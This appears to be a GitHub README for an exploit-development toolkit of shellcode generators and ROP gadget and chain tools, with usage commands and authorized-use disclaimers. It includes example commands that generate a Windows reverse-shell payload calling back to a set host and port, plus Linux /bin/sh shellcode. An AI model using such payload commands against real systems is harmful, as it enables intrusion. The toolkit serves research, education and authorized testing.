# Pentest Tools Suite

A comprehensive collection of Python-based security testing tools for exploit development, shellcode generation, and binary analysis. This suite is designed for defensive security research, vulnerability analysis, and security education.

**⚠️ For authorized security testing and defensive research only.**

---

## 🛠️ Tools Overview

### 1. 🐚 [Shellcode Generator](shellcode/)
**Multi-architecture shellcode generation with automatic bad character avoidance**

Generate position-independent shellcode for Windows (x86/x64) and Linux (ARM/ARM64) with automatic bad character encoding, ROP13 hash-based API resolution, and multiple output formats.

```bash
# Windows x64 reverse shell
cd shellcode && ./shellgen.sh --platform windows --payload reverse_shell \
  --host 10.10.14.5 --port 443 --arch x64

# Linux ARM64 command execution
./shellgen.sh --platform linux --payload execve --cmd "/bin/sh" --arch arm64
```

**Key Features:**
- ✅ x86, x64, ARM32, ARM64 support
- ✅ Automatic bad character encoding
- ✅ Windows: PEB walk + API resolution
- ✅ Linux: Direct syscalls
- ✅ Python, C, ASM, raw binary output
- ✅ Shellcode verification and debugging

**[📖 Full Documentation →](shellcode/README.md)**

---

### 2. 🔗 [ROP Tools Suite](rop/)
**Gadget analysis, PE inspection, and interactive ROP chain building**

A complete toolkit for ROP (Return-Oriented Programming) analysis including gadget parsing, PE base address extraction, and an interactive worksheet for building ROP chains.

#### Tools:
- **`get_rop_gadgets.py`** - Parse and filter ROP gadgets from rp++ output
- **`get_base_address.py`** - Extract ImageBase and PE information
- **`rop_worksheet.py`** - Interactive ROP chain building worksheet

```bash
# Find pop gadgets without bad chars
cd rop && ./get_rop_gadgets.py -f gadgets.txt -i pop -b "\x00\x0a" -m 3

# Get module base address
./get_base_address.py kernel32.dll -v

# Interactive ROP chain building
./rop_worksheet.py
```

**Key Features:**
- ✅ 18 gadget categories (stack, arithmetic, memory, etc.)
- ✅ Advanced filtering (instruction, register, regex, bad chars)
- ✅ Multi-level grouping (category → register drill-down)
- ✅ PE analysis (sections, IAT, base address)
- ✅ WinDbg integration for register/stack import
- ✅ Interactive worksheet with save/load

**[📖 Full Documentation →](rop/README.md)**

---

### 3. 📝 [Code Snippets](code_snippets/)
**Utility scripts for common exploit development tasks**

Collection of helper scripts and code skeletons for rapid exploit development.

#### Available Tools:
- **`rop_encoder_decoder.py`** - ROP chain encoding/decoding utilities
- **`skeletons.py`** - Code templates for common exploit patterns

---

### 4. 📚 [Shared Libraries](lib/)
**Common utilities used across all tools**

Shared Python modules providing consistent functionality across the entire toolkit.

- **`color_printer.py`** - Terminal color abstraction (library-independent)
  - Works with or without Rich library
  - Consistent colored output across all tools
  - Graceful fallback to plain text

---

## 🚀 Quick Start

### Installation

```bash
# Clone the repository
git clone <your-repo-url>
cd pentest-tools

# Install dependencies for all tools
pip install -r shellcode/requirements.txt
pip install -r rop/requirements.txt

# Or install globally
pip install rich pefile keystone-engine capstone
```

### Basic Usage Examples

#### Generate Windows Shellcode
```bash
cd shellcode
./shellgen.sh --platform windows --payload messagebox \
  --title "Test" --message "Hello!" --arch x86
```

#### Analyze ROP Gadgets
```bash
cd rop
rp-win-x86.exe -f target.exe -r 5 > gadgets.txt
./get_rop_gadgets.py -f gadgets.txt -g category-register -l 5
```

#### Build ROP Chain Interactively
```bash
cd rop
./rop_worksheet.py
> importregs    # Import from WinDbg
> importstack   # Import stack dump
> name shellcode 0x00501000
> chain 0x10001234 "pop eax ; ret" "Load shellcode addr"
```

---

## 📦 Project Structure

```
pentest-tools/
├── README.md                 # This file
├── LICENSE
├── .gitignore
├── lib/                      # Shared libraries
│   ├── __init__.py
│   └── color_printer.py      # Terminal color abstraction
│
├── shellcode/                # Shellcode generator
│   ├── README.md             # Shellcode documentation
│   ├── CLAUDE.md             # Technical details
│   ├── MODULAR_STRUCTURE.md  # Architecture docs
│   ├── shellgen/             # Main package
│   │   ├── encoders.py       # Bad character encoding
│   │   ├── assembler.py      # Keystone integration
│   │   ├── formatters.py     # Output formats
│   │   ├── payloads.py       # Payload builders
│   │   ├── cli.py            # CLI interface
│   │   └── generators/       # OS-specific generators
│   │       ├── windows.py    # Windows shellcode
│   │       └── linux.py      # Linux shellcode
│   ├── shellgen_cli.py       # Main entry point
│   ├── shellgen.sh           # Wrapper script
│   ├── hash_generator.py     # ROR13 hash tool
│   └── requirements.txt
│
├── rop/                      # ROP tools suite
│   ├── README.md             # ROP tools documentation
│   ├── CLAUDE.md             # Development notes
│   ├── core/                 # Core modules
│   │   ├── gadget.py         # Gadget dataclass
│   │   ├── parser.py         # File parsing
│   │   ├── categories.py     # Categorization
│   │   └── pe_info.py        # PE analysis
│   ├── display/              # Output formatting
│   │   └── formatters.py
│   ├── get_rop_gadgets.py    # Gadget analyzer
│   ├── get_base_address.py   # PE base extractor
│   ├── rop_worksheet.py      # Interactive worksheet
│   ├── tests/                # Test suite
│   └── requirements.txt
│
└── code_snippets/            # Utility scripts
    ├── rop_encoder_decoder.py
    └── skeletons.py
```

---

## 🎯 Use Cases

### 1. Exploit Development
- Generate shellcode with bad character restrictions
- Find ROP gadgets in vulnerable binaries
- Build and test ROP chains interactively
- Extract module base addresses for ASLR calculations

### 2. Security Research
- Analyze binary security features
- Study ROP attack techniques
- Understand shellcode encoding methods
- Examine PE file structure

### 3. Vulnerability Analysis
- Test exploit payloads
- Analyze malware shellcode
- Identify code caves
- Map import/export tables

### 4. Security Education
- Learn shellcode generation
- Understand ROP exploitation
- Practice exploit development
- Study binary analysis

### 5. Red Team Operations
- Generate custom payloads
- Bypass security restrictions
- Develop exploits for authorized testing
- Chain exploitation primitives

---

## 🔧 System Requirements

### Python Version
- Python 3.6 or higher

### Operating Systems
- **Linux**: Full support for all tools
- **Windows**: Full support (shellcode generator, ROP tools)
- **macOS**: Full support with Keystone/Capstone

### Dependencies

#### Core Dependencies (All Tools)
```bash
pip install rich           # Colored terminal output (optional but recommended)
```

#### Shellcode Generator
```bash
pip install keystone-engine    # Assembly
pip install capstone           # Disassembly (for --debug-shellcode)
```

#### ROP Tools
```bash
pip install pefile         # PE file parsing (get_base_address.py)
```

#### Interactive Tools
```bash
pip install rich           # ROP worksheet colored output
```

---

## 📖 Documentation

Each tool has detailed documentation in its respective directory:

- **[Shellcode Generator](shellcode/README.md)** - Full usage guide, examples, API reference
- **[Shellcode Technical Details](shellcode/CLAUDE.md)** - Implementation details, architecture
- **[ROP Tools Suite](rop/README.md)** - Complete tool documentation
- **[ROP Development Notes](rop/CLAUDE.md)** - Feature history, technical notes

---

## 🎓 Learning Resources

### Shellcode Generation
- Windows PEB walk technique
- x64 fastcall convention
- Bad character encoding strategies
- ARM syscall conventions

### ROP Exploitation
- Gadget categorization and selection
- Stack pivot techniques
- Register manipulation
- Chain building strategies

### Recommended Reading
- [PEB Walk Technique](https://en.wikipedia.org/wiki/Process_Environment_Block)
- [ROR13 Hash Algorithm](https://www.fireeye.com/blog/threat-research/2019/10/api-hashing-tool.html)
- [ARM Syscall Reference](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
- [Keystone Engine](http://www.keystone-engine.org/)

---

## 🔒 Security Notice

### Authorized Use Only

This toolkit is designed for **authorized security testing and defensive research only**:

✅ **Permitted Uses:**
- Penetration testing engagements (with written authorization)
- Security research and education
- Defensive security analysis
- Red team operations (authorized)
- CTF competitions
- Malware analysis
- Vulnerability research
- Developing security mitigations

❌ **Prohibited Uses:**
- Unauthorized access to systems
- Malware development for malicious purposes
- Attacks on systems you don't own or have permission to test
- Any illegal activities

### Disclaimer

The authors of this toolkit are not responsible for misuse of these tools. Users must:
- Obtain explicit written authorization before testing any systems
- Comply with all applicable laws and regulations
- Use tools only for defensive and educational purposes
- Ensure proper ethical guidelines are followed

---

## 🤝 Contributing

Contributions are welcome! When adding features:

1. **Maintain Architecture** - Follow existing modular structure
2. **Update Documentation** - Update README.md and tool-specific docs
3. **Test Thoroughly** - Test across different platforms and scenarios
4. **Consistent Style** - Follow existing code conventions
5. **Share Knowledge** - Document new techniques in CLAUDE.md

### Development Guidelines

- Use the shared `lib/color_printer` for consistent output
- Keep core logic separate from display logic
- Write testable, modular code
- Document all public APIs
- Add examples for new features

---

## 📜 License

This toolkit is provided for educational and authorized security testing purposes only.

---

## 👤 Author

**Dawid Esterhuizen**

---

## 🙏 Acknowledgments

- **Keystone Engine** - Multi-architecture assembler
- **Capstone Engine** - Disassembly framework
- **pefile** - PE file parsing
- **Rich** - Terminal formatting library
- **rp++** - ROP gadget finder

---

## 📞 Support

For questions, issues, or feature requests:
- Open an issue on GitHub
- Check tool-specific documentation
- Review CLAUDE.md for technical details

---

**⚠️ Remember: Always obtain explicit authorization before testing any system you do not own.**